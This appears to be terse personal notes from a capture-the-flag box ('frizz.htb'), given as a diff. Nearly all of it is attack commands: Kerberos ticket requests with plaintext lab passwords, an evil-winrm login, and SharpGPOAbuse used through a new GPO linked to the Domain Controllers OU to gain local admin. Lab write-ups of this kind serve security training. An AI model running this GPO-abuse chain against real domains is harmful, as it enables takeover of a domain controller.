@@ -1,0 +1,17 @@
+impacket-getTGT frizz.htb/f.frizzle:Jenni_Luvs_Magic23 -dc-ip $victim 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+[*] Saving ticket in f.frizzle.ccache
+export KRB5CCNAME=f.frizzle.ccache
+evil-winrm -i frizzdc.frizz.htb -r FRIZZ.HTB -k f.frizzle.ccache
+
+
+
+impacket-getTGT frizz.htb/M.Schoolbus:'!suBcig@MehTed!R' -dc-ip $victim
+
+M.Schoolbus can write GPO
+New-GPO -Name pwn | New-GPLink -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB" -LinkEnabled Yes
+.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName pwn
+gpupdate /force 
+
+I had to reconnect a times via evil-winrm, before I was really local admin by the GPO abuse
+type C:\Users/Administrator/Desktop/root.txt
